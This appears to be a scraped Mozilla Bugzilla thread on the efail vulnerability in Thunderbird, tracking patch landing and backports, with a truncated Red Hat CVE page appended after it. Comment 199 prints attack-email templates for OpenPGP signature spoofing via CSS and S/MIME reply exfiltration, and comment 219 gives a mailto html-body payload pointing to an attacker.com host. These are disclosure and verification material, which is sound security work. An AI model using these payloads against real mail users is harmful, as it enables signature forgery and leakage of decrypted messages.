52.8.1 is what we need to get out right now. The 52 patch works for me for TB 52. Including the test message you attached, and all messages from my inbox that I tried, and the attack emails. 52 hasn't ever crashed for me. Did you test on 52? Does it work?
But if this v5.1 patch really doesn't work, then we can land v4. It misses the margin for the separator, but that's not that serious. We can fix it later properly. We need to get the security fix out.
Jörg or Magnus, it's up to you now. We can land either v5.1 or v4.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15641041_22599)• 7 years ago |

[Attachment #8979192](/attachment.cgi?id=8979192&action=edit "Separate MIME parts from each other, v5.1 (for 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15641058_22599)• 7 years ago |

[Attachment #8976363](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15641131_22599)• 7 years ago |

[Attachment #8976363](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15641156_22599)• 7 years ago |

[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Attachment description: Separate MIME parts from each other, v4 (trunk and 52) - not for landing, but contains code for TB 52 and 60. → Separate MIME parts from each other, v4 (trunk and 52)
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 191](/show_bug.cgi?id=1419417#c191)• 7 years ago |
|  | |

Ben, no one builds TB 52.x at home. Everyone builds on trunk. I don't understand why you're asking for review again when attachment v4 again, when a later version already had r+ and I addressed the review comments "Content-Type" later.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 192](/show_bug.cgi?id=1419417#c192)• 7 years ago |
|  | |

Ben indicated that he is done here, so I'll collect the pieces and get them landed.Assignee: ben.bucksch → jorgk

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15645817_176914)• 7 years ago |

[Attachment #8979190](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15645832_176914)• 7 years ago |

[Attachment #8979192](/attachment.cgi?id=8979192&action=edit "Separate MIME parts from each other, v5.1 (for 52)") -
Attachment is obsolete: true
[Attachment #8979192](/attachment.cgi?id=8979192&action=edit "Separate MIME parts from each other, v5.1 (for 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15645859_176914)• 7 years ago |

[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Attachment is obsolete: true
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15645892_176914)• 7 years ago |

[Attachment #8979123](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15645967_176914)• 7 years ago |

[Attachment #8979211](/attachment.cgi?id=8979211&action=edit "1419417-fix-tests.patch (v3)") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15646030_176914)• 7 years ago |

[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Attachment is obsolete: false
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 193](/show_bug.cgi?id=1419417#c193)• 7 years ago |
|  | |

<https://hg.mozilla.org/comm-central/rev/96fab4a2b81189101231b12106823748c9a70a94>
Parse HTML to make sure that tags and attributes are properly closed. r=mkmelin,jorgk
<https://hg.mozilla.org/comm-central/rev/a2472fbf9a2c07e95419cfefa1eb5dd3cd396d88>
adjust test expectancy. r=mkmelin,BenB
<https://hg.mozilla.org/comm-central/rev/d16fff497d408a3ece7f9eb58874e8151bec70c5>
revert temporary fix from [bug 1457721](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"). r=mkmelin
A few comments:
Part one is v4 with my clean-up:
I opted for "content-type" because other parts of the system use that string in lower case. That makes the test easier. Also, that will most likely be removed in [bug 1463133](/show_bug.cgi?id=1463133 "RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense"). It also matches mimethsa.cpp.
I'm not comfortable uplifting this, since the DOM created by the patch isn't right, see [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>"), so the body comes after the <div> tag. We should address this in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") for "original" and "simple" HTML now. That was basically the difference between v4 and v5.Status: ASSIGNED → RESOLVEDClosed: 7 years ago
[status-thunderbird61](/buglist.cgi?f1=cf_status_thunderbird_61&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_61&o1=equals&v1=affected)
[status-thunderbird62](/buglist.cgi?f1=cf_status_thunderbird_62&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_62&o1=equals&v1=fixed)
[status-thunderbird\_esr52](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=equals&v1=affected)
[status-thunderbird\_esr60](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=equals&v1=affected)Resolution: --- → FIXEDTarget Milestone: --- → Thunderbird 62.0

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 194](/show_bug.cgi?id=1419417#c194)• 7 years ago |
|  | |

> Ben, no one builds TB 52.x at home. Everyone builds on trunk.
I guess, I'm no one, then :)
My whole goal here was to fix TB 52.
But that's now in the hands of drivers.
Thanks for landing this.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 195](/show_bug.cgi?id=1419417#c195)• 7 years ago |
|  | |

Per Mozilla security bug policy, we unhide security bugs where the details are public anyway. I am going to unhide this bug in 3 days. Because the bug and exploit is very public, literally front page news, and the paper with the bug and attack details has been released about a week ago, and people are very interested in the status.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 196](/show_bug.cgi?id=1419417#c196)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #194](/show_bug.cgi?id=1419417#c194 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> My whole goal here was to fix TB 52.
Yes, but that's not how we develop.
> But that's now in the hands of drivers.
I'll get it uplifted. I think it's quite risky since we're drastically change the HTML processing. So we might trigger all sorts of bugs/crashes in Gecko's parser or serialiser.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15668763_1689)• 7 years ago |

Group: mail-core-security → core-security-release

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 197](/show_bug.cgi?id=1419417#c197)• 7 years ago |
|  | |

TB 52.8.1 ESR:
<https://hg.mozilla.org/releases/comm-esr52/rev/6eca16d60d9031dce68473eb3e1693116e4df3c1>
<https://hg.mozilla.org/releases/comm-esr52/rev/6b77778b904037f6f603a9424deb6e98cf3e1e97>
<https://hg.mozilla.org/releases/comm-esr52/rev/e3e80074c7e10f6dbcd596001b1e995e4f78a492>
[status-thunderbird\_esr52](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=equals&v1=fixed)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 198](/show_bug.cgi?id=1419417#c198)• 7 years ago |
|  | |

Jens, can you please make the Daily TB 52 ESR build at
<https://archive.mozilla.org/pub/thunderbird/nightly/2018/05/2018-05-22-03-02-01-comm-esr52/>
available to your colleagues and Hanno for testing.Flags: needinfo?(jens.a.mueller)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15756451_176914)• 7 years ago |

[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: approval-comm-esr60+
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: approval-comm-esr52+
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: approval-comm-beta+

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 199](/show_bug.cgi?id=1419417#c199)• 7 years ago |
|  | |

I found some time to re-test TB nightly (2018-05-22) and Enigmail version 2.0.5 (20180521-1522).
As far as I can tell, the related preconnect remote content bypass is fixed ([bug 1408867](/show_bug.cgi?id=1408867 "RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block")). As well is leaking the plaintext by tricking the user into submitting the it via HTML forms ([Bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too"), [Bug 1462910](/show_bug.cgi?id=1462910 "RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field")) or remote images ([bug 1457721](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute")).
Please note that there may still be bypasses -- in the long term I'd agree with what Ben said ([comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")).
What still works imho is variants of OpenPGP signature spoofing and S/MIME reply-or-forward exfiltration:
\* OpenPGP: signature spoofing based on hiding the real signed text with CSS
---------------------------------------------------
Content-Type: text/html
This is arbitrary text inserted by the attacker...
The mail says `good signature' by the entity below
<div style="color: red;">
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
THIS PART IS SIGNED BUT CAN BE HIDDEN WITH CSS
-----BEGIN PGP SIGNATURE-----
...
-----END PGP SIGNATURE-----
```
---------------------------------------------------
\* S/MIME: decrypted MIME parts can be completely hidden with CSS; if user replies/forwards in HTML format the (non-visible) plaintext is leaked, otherwise (in text-only reply mode) the victim could be fooled by inserting newlines
---------------------------------------------------
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
Content-Type: text/html
Reply please to this email
<div style="color: red;">
--BOUNDARY
Content-Type: application/pkcs7-mime; name="smime.p7m"; smime-type=enveloped-data
Content-Transfer-Encoding: base64
...
--BOUNDARY--
---------------------------------------------------
Also I still don't feel comfortable with mailto:?html-body=whatever
Do we actually need this? It allows a website to put untrusted input into composer. This enables an attacker to escalate into HTML context (even if HTML-composing has been disabled by the user); furthermore stuff like <video poster="..."> is loaded automatically here (no user interaction required). If there is no valid requirement for ?html-body it should be removed from TB, imho. (I'm unable to exploit it straight-forward but I have a really bad feeling about this feature).Status: RESOLVED → REOPENEDFlags: needinfo?(jens.a.mueller)Resolution: FIXED → ---

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 200](/show_bug.cgi?id=1419417#c200)• 7 years ago |
|  | |

Attached file
[OpenPGP Signature Spoofing](attachment.cgi?id=8979995)
— [Details](attachment.cgi?id=8979995&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 201](/show_bug.cgi?id=1419417#c201)• 7 years ago |
|  | |

Attached image
[OpenPGP Signature Spoofing (Screenshot)](attachment.cgi?id=8979996)
— [Details](attachment.cgi?id=8979996&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 202](/show_bug.cgi?id=1419417#c202)• 7 years ago |
|  | |

Attached file
[S/MIME Reply Exfiltration](attachment.cgi?id=8979997)
— [Details](attachment.cgi?id=8979997&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 203](/show_bug.cgi?id=1419417#c203)• 7 years ago |
|  | |

Attached image
[S/MIME Reply Exfiltration (Screenshot)](attachment.cgi?id=8979998)
— [Details](attachment.cgi?id=8979998&action=edit)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 204](/show_bug.cgi?id=1419417#c204)• 7 years ago |
|  | |

I'm afraid at comment >200 we're not going to reopen this(\*). Please file a follow-up.
(\*) Strictly reopening is only when a patch is backed out which is not the case here.Status: REOPENED → RESOLVEDClosed: 7 years ago → 7 years agoResolution: --- → FIXED

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 205](/show_bug.cgi?id=1419417#c205)• 7 years ago |
|  | |

TB 60 beta 7 (BETA\_60\_CONTINUATION branch):
<https://hg.mozilla.org/releases/comm-beta/rev/6ff4b0b96518>
<https://hg.mozilla.org/releases/comm-beta/rev/1d4a70869ef3>
<https://hg.mozilla.org/releases/comm-beta/rev/6b09af3c9a3a>
[status-thunderbird60](/buglist.cgi?f1=cf_status_thunderbird_60&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_thunderbird_60&o1=equals&v1=fixed)

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 206](/show_bug.cgi?id=1419417#c206)• 7 years ago |
|  | |

Jens, [comment 201](/show_bug.cgi?id=1419417#c201 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") relates to Enigmail. Inline-PGP is not handled by TBird at all. I'll take this to the Enigmail bug tracker.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 207](/show_bug.cgi?id=1419417#c207)• 7 years ago |
|  | |

(In reply to Jens Müller from [comment #199](/show_bug.cgi?id=1419417#c199 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> As far as I can tell, the related preconnect remote content bypass is fixed
> ([bug 1408867](/show_bug.cgi?id=1408867 "RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block")). As well is leaking the plaintext by tricking the user into
> submitting the it via HTML forms ([Bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too"), [Bug 1462910](/show_bug.cgi?id=1462910 "RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field")) or remote images
> ([bug 1457721](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute")).
Good. Thanks for verifying!
I'm setting this on VERIFIED FIXED on behalf of Jens.
> Please note that there may still be bypasses -- in the long term I'd agree
> with what Ben said ([comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")).
...
> \* S/MIME: decrypted MIME parts can be completely hidden with CSS; if user
> replies/forwards in HTML format the (non-visible) plaintext is leaked,
That attacks the composer and is an issue separate from the one that was fixed here.
I actually have a solution for that, and a fix. It's the "Sanitize HTML quotes" patch here. It's already described and covered in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") point 2.
For the sake of not prolonging this bug which already has over 200 comments, I would suggest to tackle that separate issue in another bug.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15888739_22599)• 7 years ago |

Status: RESOLVED → VERIFIED

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 208](/show_bug.cgi?id=1419417#c208)• 7 years ago |
|  | |

Filed [bug 1464056](/show_bug.cgi?id=1464056 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward") for the reply-or-forward issue

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15976802_176914)• 7 years ago |

Depends on: [1464391](/show_bug.cgi?id=1464391 "RESOLVED FIXED - New HTML processing introduced in bug 1419417 causes badly rendered HTML")

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490) |  |
| --- | --- | --- |
| [Comment 209](/show_bug.cgi?id=1419417#c209)• 7 years ago |
|  | |

Some comments based on viewing code in the commits linked to from [comment 205](/show_bug.cgi?id=1419417#c205 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
\* Assembling the whole document that's displayed by concatenating strings seems more error prone and less efficient than parsing each MIME part into a document fragment (nsIParserUtils::parseFragment()) using <body> as the context node, sanitizing to remove forms, etc., and then appending the resulting fragments into a skeleton document wrapped in the kind of fieldsets (created using the DOM APIs) that are currently produced by injecting source text.
\* While it's unlikely in practice for encrypted parts to contain form controls with a form attribute whole value the attacker could guess, it's worthwhile to be aware of <https://html.spec.whatwg.org/#attr-fae-form> . Since it's implausible enough for form submissions to be a legitimate use case in the context of emails that contain encrypted parts, I recommend erring on the side of sanitizing more (setting SanitizerDropForms, etc.) in all MIME parts when there is at least one encrypted MIME part. It's not like you need to show a browser-like newsletter rendering experience for encrypted emails.
\* In addition to sanitizing form and form control elements, it would probably be a good idea to block form submissions in the message viewer and message editor docshells.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 210](/show_bug.cgi?id=1419417#c210)• 7 years ago |
|  | |

The last item would be [bug 1462910](/show_bug.cgi?id=1462910 "RESOLVED FIXED - Efail: Using form to exfiltrate encrypted mail part by pressing enter in form field") and the ones that went before, like [bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too"):
<https://hg.mozilla.org/comm-central/rev/48d7285be1417167d9e230f28b7c7a85db1f4a53#l1.31>

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 211](/show_bug.cgi?id=1419417#c211)• 7 years ago |
|  | |

Can we get this released, please?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 212](/show_bug.cgi?id=1419417#c212)• 7 years ago |
|  | |

It's in TB 60 beta 7, released yesterday.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 213](/show_bug.cgi?id=1419417#c213)• 7 years ago |
|  | |

I mean TB 52.8.1. Users are waiting for it since 3 weeks.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 214](/show_bug.cgi?id=1419417#c214)• 7 years ago |
|  | |

While this is a required step, it's essentially useless without [bug 1464667](/show_bug.cgi?id=1464667 "RESOLVED FIXED - Suppress <plaintext> in email messages"), so we need that too.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 215](/show_bug.cgi?id=1419417#c215)• 7 years ago |
|  | |

... and more importantly [bug 1464056](/show_bug.cgi?id=1464056 "RESOLVED FIXED - [efail] S/MIME plaintext can be leaked through HTML reply/forward"), right? Suppressing <plaintext> is one thing, but preventing subordinate parts being decrypted is an approach that will also stop attacks where the decrypted part is hidden by CSS.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 216](/show_bug.cgi?id=1419417#c216)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #213](/show_bug.cgi?id=1419417#c213 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> I mean TB 52.8.1. Users are waiting for it since 3 weeks.
Ben, sadly your changes here exposed ancient old bugs to the regular HTML forward:
[Bug 313401](/show_bug.cgi?id=313401 "RESOLVED DUPLICATE - forwarding multipart/related message inline does not include body, if <html> tag has attribute and View/Message Body As/Simple HTML is used") and [bug 394322](/show_bug.cgi?id=394322 "RESOLVED FIXED - forward inline from Simple HTML view creates blank email if html tag has attribution (typically originating from MS software)"). We got there via [bug 1470210](/show_bug.cgi?id=1470210 "RESOLVED DUPLICATE - Forward Inline fails to include original HTML message text when inline image is present").
So this is certainly NOT ready for prime time use since it destroys inline forwarding of messages received from users using MS software.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a19374862_280903)• 7 years ago |

Alias: CVE-2018-12372

|  | [Wayne Mery (:wsmwk)](/user_profile?user_id=29811) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a19804891_29811)• 7 years ago |

Depends on: [1473893](/show_bug.cgi?id=1473893 "RESOLVED FIXED - Detaching attachments corrupts the main body of the e-mail text")

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 217](/show_bug.cgi?id=1419417#c217)• 7 years ago |
|  | |

<https://hg.mozilla.org/releases/comm-esr60/rev/5f006e51c11d>
<https://hg.mozilla.org/releases/comm-esr60/rev/98a9416eb471>
<https://hg.mozilla.org/releases/comm-esr60/rev/74d4c8c64c9c>
[status-thunderbird61](/buglist.cgi?f1=cf_status_thunderbird_61&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_61&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_thunderbird_61&o1=equals&v1=wontfix)
[status-thunderbird\_esr60](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=equals&v1=fixed)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 219](/show_bug.cgi?id=1419417#c219)• 6 years ago |
|  | |

quick update: I re-tested mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E"> in TB 60.2.1 and it still allows an attacker to escalate into html context -- if not required this `feature' should be disabled.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 220](/show_bug.cgi?id=1419417#c220)• 6 years ago |
|  | |

Jens, can you please file a new bug about this? You can mention it here for reference. Thanks.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 221](/show_bug.cgi?id=1419417#c221)• 6 years ago |
|  | |

This shipped 8 months ago. Could we please open this bug up?

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 223](/show_bug.cgi?id=1419417#c223)• 6 years ago |
|  | |

Update: Here's a full (public) report on reply-based `decryption oracles` and `signature oracles` ([bug #1530106](/show_bug.cgi?id=1530106 "RESOLVED FIXED - Signing Oracle based on keeping CSS styles in replies to HTML emails")):

<https://arxiv.org/ftp/arxiv/papers/1904/1904.07550.pdf>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a70627105_1689)• 5 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1419417&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Jens Müller](/user_profile?user_id=588172)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.redhat.com_1791bdf5_20250126_073639.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1598543)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1598543)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1598543)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1598543

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1598543**](show_bug.cgi?id=1598543)
(CVE-2018-12374)
- [CVE-2018-12374](https://access.redhat.com/security/cve/CVE-2018-12374) thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2018-12374 thunderbird: Using form to exfiltrate encrypted mail part by p...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2018-12374 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs 